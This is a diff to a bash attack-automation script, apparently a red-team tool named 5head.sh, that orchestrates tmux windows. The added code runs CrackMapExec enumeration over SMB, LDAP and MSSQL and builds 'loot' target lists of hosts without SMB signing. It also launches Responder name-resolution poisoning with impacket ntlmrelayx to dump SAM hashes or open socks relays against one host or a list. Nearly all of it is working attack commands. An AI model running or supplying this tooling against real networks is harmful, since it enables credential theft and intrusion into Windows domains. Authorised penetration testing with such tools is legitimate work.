@@ -67,6 +67,7 @@ if [ -z "${TMUX}" ]; then
         window=0
         tmux new-session -d -s $session ./5head.sh
         tmux rename-window -t $session:$window 'main'
+	tmux set-option -t $session mouse on
         tmux attach-session -t $session
         exit 1;
 fi
@@ -100,37 +101,148 @@ function packet_cap() {
 
 function cme_enum_smb() {
         echo -e '[*] Enumerating SMB targets with CrackMapExec...\n'
-        tmux new-window -n "cme_enum"
-        tmux send-keys -t 5head:cme_enum 'PROMPT="%F{9}5head.sh%f > "' C-m
-        tmux send-keys -t 5head:cme_enum 'clear' C-m
-        tmux send-keys -t 5head:cme_enum 'deps/cme smb $targets >> loot/cme_enum.txt' C-m
+        tmux new-window -n "cme_enum_smb"
+        tmux send-keys -t 5head:cme_enum_smb 'PROMPT="%F{9}5head.sh%f > "' C-m
+        tmux send-keys -t 5head:cme_enum_smb 'clear' C-m
+        tmux send-keys -t 5head:cme_enum_smb 'deps/cme smb $targets >> loot/cme_enum_smb.txt' C-m
         tmux split-window -v -l 80%
-	tmux send-keys -t 5head:cme_enum 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
-	tmux send-keys -t 5head:cme_enum 'tail -f loot/cme_enum.txt' C-m
+	tmux send-keys -t 5head:cme_enum_smb 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
+	tmux send-keys -t 5head:cme_enum_smb 'tail -f loot/cme_enum_smb.txt' C-m
 }
 
 function cme_enum_ldap() {
-        echo "temp"
+        echo -e '[*] Enumerating LDAP targets with CrackMapExec...\n'
+        tmux new-window -n "cme_enum_ldap"
+        tmux send-keys -t 5head:cme_enum_ldap 'PROMPT="%F{9}5head.sh%f > "' C-m
+        tmux send-keys -t 5head:cme_enum_ldap 'clear' C-m
+        tmux send-keys -t 5head:cme_enum_ldap 'deps/cme ldap $targets >> loot/cme_enum_ldap.txt' C-m
+        tmux split-window -v -l 80%
+        tmux send-keys -t 5head:cme_enum_ldap 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
+        tmux send-keys -t 5head:cme_enum_ldap 'tail -f loot/cme_enum_ldap.txt' C-m
 }
 
 function cme_enum_mssql() {
-        echo "temp"
+        echo -e '[*] Enumerating MSSQL targets with CrackMapExec...\n'
+        tmux new-window -n "cme_enum_mssql"
+        tmux send-keys -t 5head:cme_enum_mssql 'PROMPT="%F{9}5head.sh%f > "' C-m
+        tmux send-keys -t 5head:cme_enum_mssql 'clear' C-m
+        tmux send-keys -t 5head:cme_enum_mssql 'deps/cme mssql $targets >> loot/cme_enum_mssql.txt' C-m
+        tmux split-window -v -l 80%
+        tmux send-keys -t 5head:cme_enum_mssql 'bash -c "stty -echo;clear;echo -e \"[*] Listing output from CrackMapExec...\n[*] Press enter in window above periodically...\";stty echo"' C-m
+        tmux send-keys -t 5head:cme_enum_mssql 'tail -f loot/cme_enum_mssql.txt' C-m
+}
+
+function gen_targets() {
+	## SMB
+	echo "[*] Generating smb_targets.txt list..."
+	if test ! -f "loot/smb_targets.txt" && test -f "loot/cme_enum_smb.txt"; then
+		grep -F -- "$domain" loot/cme_enum_smb.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
+		echo -e "[+] smb_targets.txt generated...\n"
+	else
+		echo -ne $red'[-] ERROR: smb_targets.txt generation failed. Does loot/cme_enum_smb.txt exist?\n'$clear
+	fi
+
+	## LDAP
+	echo "[*] Generating ldap_targets.txt list..."
+        if test ! -f "loot/ldap_targets.txt" && test -f "loot/cme_enum_ldap.txt"; then
+                grep -F -- "$domain" loot/cme_enum_ldap.txt | cut -d " " -f 10 > loot/ldap_targets.txt
+                echo -e "[+] ldap_targets.txt generated...\n"
+	else
+		echo -ne $red'[-] ERROR: ldap_targets.txt generation failed. Does loot/cme_enum_ldap.txt exist?\n'$clear
+        fi
+
+	## MSSQL
+	echo "[*] Generating mssql_targets.txt list..."
+        if test ! -f "loot/mssql_targets.txt" && test -f "loot/cme_enum_mssql.txt"; then
+                grep -F -- "$domain" loot/cme_enum_mssql.txt | cut -d " " -f 10 > loot/mssql_targets.txt
+                echo -e "[+] mssql_targets.txt generated...\n"
+        else
+		echo -ne $red'[-] ERROR: mssql_targets.txt generation failed. Does loot/cme_enum_mssql.txt exist?\n'$clear
+	fi
+
+	## Multi
+	echo "[*] Generating multi_targets.txt list..."
+	if test ! -f "loot/multi_targets.txt"; then
+		sed 's/^/smb:\/\//g' loot/smb_targets.txt >> loot/multi_targets.txt
+		sed 's/^/ldap:\/\//g' loot/ldap_targets.txt >> loot/multi_targets.txt
+		sed 's/^/mssql:\/\//g' loot/mssql_targets.txt >> loot/multi_targets.txt
+		echo -e "[+] multi_targets.txt generated...\n"
+	else
+		echo -ne $red'[-] ERROR: multi_targets.txt already exists.\n'$clear
+	fi
 }
 
 function ntlmrelay_smb_dump() {
-	echo -e '[*] Setting up Responder + Ntlmrelayx.py (SAM dump)...\n'
-	tmux new-window -n "relay"
-	tmux send-keys -t 5head:relay 'PROMPT="%F{9}5head.sh%f > "' C-m
-	tmux send-keys -t 5head:relay 'clear' C-m
-	tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
-	tmux split-window -h -l 50%
-	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
-	grep -F -- "$domain" cme_enum.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
-	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
+	smb_dump_solo() {
+		ColorCyan 'Enter target host: '
+		read solo_target
+		export solo_target=$solo_target
+		echo -e '[*] Setting up Responder + Ntlmrelayx.py to one SMB target (SAM dump)...\n'
+		tmux new-window -e "solo_target=${solo_target}" -n "relay"
+		tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+		tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+		tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+		tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support' C-m
+	}
+	smb_dump_multi() {
+		if test -f "loot/smb_targets.txt"; then
+			echo -e '[*] Setting up Responder + Ntlmrelayx.py to SMB targets file (SAM dump)...\n'
+			tmux new-window -n "relay"
+        	        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                	tmux split-window -h -l 50%
+                	tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                	tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support' C-m
+		else
+			echo -ne $red'[-] ERROR: smb_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
+		fi
+	}
+	ColorCyan '\nRelay to an individual host or a list of targets?\n'
+	ColorGreen '1)' && echo -e " Specific host"
+	ColorGreen '2)' && echo -e " Targets file"
+	ColorCyan 'Choose an option: '
+	        read a
+        	case $a in
+                	1) smb_dump_solo ;;
+                	2) smb_dump_multi ;;
+                	*) echo -e "Invalid command entered... exiting\n\n";
+        	esac
 }
 
 function ntlmrelay_smb_socks() {
-        echo "temp"
+       smb_socks_solo() {
+                ColorCyan 'Enter target host: '
+                read solo_target
+                export solo_target=$solo_target
+                echo -e '[*] Setting up Responder + Ntlmrelayx.py to one SMB target (socks)...\n'
+                tmux new-window -e "solo_target=${solo_target}" -n "relay"
+                tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                tmux split-window -e "solo_target=${solo_target}" -h -l 50%
+                tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                tmux send-keys -t 5head:relay 'ntlmrelayx.py -t ${solo_target} -smb2support -socks' C-m
+        }
+        smb_socks_multi() {
+                if test -f "loot/smb_targets.txt"; then
+                        echo -e '[*] Setting up Responder + Ntlmrelayx.py to SMB targets file (socks)...\n'
+                        tmux new-window -n "relay"
+                        tmux send-keys -t 5head:relay 'python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w' C-m
+                        tmux split-window -h -l 50%
+                        tmux send-keys -t 5head:relay 'source deps/impacket-0.10.0/bin/activate' C-m
+                        tmux send-keys -t 5head:relay 'ntlmrelayx.py -tf loot/smb_targets.txt -smb2support -socks' C-m
+                else
+                        echo -ne $red'[-] ERROR: smb_targets.txt does not exist.\nTry running the Enum -> SMB enumeration module\n'$clear
+                fi
+        }
+        ColorCyan '\nRelay to an individual host or a list of targets?\n'
+        ColorGreen '1)' && echo -e " Specific host"
+        ColorGreen '2)' && echo -e " Targets file"
+        ColorCyan 'Choose an option: '
+                read a
+                case $a in
+                        1) smb_socks_solo ;;
+                        2) smb_socks_multi ;;
+                        *) echo -e "Invalid command entered... exiting\n\n";
+                esac
+
 }
 
 function ntlmrelay_ldap_socks() {
@@ -250,30 +362,32 @@ $(ColorCyan 'Choose a function:') "
 poison(){
 echo -ne "
 ~ 5head.sh -> poison ~
+$(ColorGreen '1)') Generate target lists from CME output
 $(ColorGreen '## LLMNR/NBT-NS/MDNS')
-$(ColorGreen '1)') SMB: Responder + ntlmrelayx (SAM dump)
-$(ColorGreen '2)') SMB: Responder + ntlmrelayx (socks)
-$(ColorGreen '3)') LDAP: Responder + ntlmrelayx (socks)
-$(ColorGreen '4)') LDAP: Responder + ntlmrelayx (delegate access)
-$(ColorGreen '5)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
-$(ColorGreen '6)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '2)') SMB: Responder + ntlmrelayx (SAM dump)
+$(ColorGreen '3)') SMB: Responder + ntlmrelayx (socks)
+$(ColorGreen '4)') LDAP: Responder + ntlmrelayx (socks)
+$(ColorGreen '5)') LDAP: Responder + ntlmrelayx (delegate access)
+$(ColorGreen '6)') MSSQL: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
+$(ColorGreen '7)') MUTLI: Responder + ntlmrelayx $(ColorRed 'NOT IMPLEMENTED')
 $(ColorGreen '## DHCPv6')
-$(ColorGreen '7)') LDAP: mitm6 + ntlmrelayx (socks)
-$(ColorGreen '8)') LDAP: mitm6 + ntlmrelayx (delegate access)
+$(ColorGreen '8)') LDAP: mitm6 + ntlmrelayx (socks)
+$(ColorGreen '9)') LDAP: mitm6 + ntlmrelayx (delegate access)
 $(ColorGreen '## Other')
 $(ColorGreen '0)') Detach tmux
 $(ColorGreen 'b)') Back to main menu...
 $(ColorCyan 'Choose a function:') "
         read a
         case $a in
-		1) ntlmrelay_smb_dump ; poison ;;
-		2) ntlmrelay_smb_socks ; poison ;;
-		3) ntlmrelay_ldap_socks ; posion ;;
-		4) ntlmrelay_ldap_rbcd ; poison ;;
-		5) ntlmrelay_mssql_socks ; poison ;;
-		6) ntlmrelay_multi ; poison ;;
-		7) mitm6_ldap_socks ; poison ;;
-		8) mitm6_ldap_rbcd ; poison ;;
+		1) gen_targets ; poison ;;
+		2) ntlmrelay_smb_dump ; poison ;;
+		3) ntlmrelay_smb_socks ; poison ;;
+		4) ntlmrelay_ldap_socks ; posion ;;
+		5) ntlmrelay_ldap_rbcd ; poison ;;
+		6) ntlmrelay_mssql_socks ; poison ;;
+		7) ntlmrelay_multi ; poison ;;
+		8) mitm6_ldap_socks ; poison ;;
+		9) mitm6_ldap_rbcd ; poison ;;
 		0) tmux detach ;;
                 b) menu ;;
                 *) echo "Invalid command entered"; poison ;;
